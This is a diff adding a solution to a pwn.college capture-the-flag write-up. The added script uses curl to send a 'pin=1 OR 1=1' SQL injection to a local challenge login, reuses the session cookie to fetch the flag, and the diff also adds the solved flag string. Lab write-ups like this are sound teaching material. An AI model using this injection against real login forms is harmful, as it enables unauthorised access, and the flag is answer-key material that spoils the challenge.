@@ -6,11 +6,17 @@ This level, on the other hand, is SQL injectible, as it purposefully uses a slig
 ## Steps
 
 ```bash
+#!/bin/bash
 
+# Step 1: Send a POST request and save the session cookie
+curl -c cookies.txt -X POST -d "account-id=admin&pin=1 OR 1=1" http://challenge.localhost/identity
+
+# Step 2: Send a GET request to retrieve the flag with the saved cookie
+curl -b cookies.txt http://challenge.localhost/identity
 ```
 
 ## Solution
 
 ```
-
+pwn.college{UFRzBMFPKIQxneZV6E09ysgLKaB.dNzN1YDL3MTM3QzW}
 ```
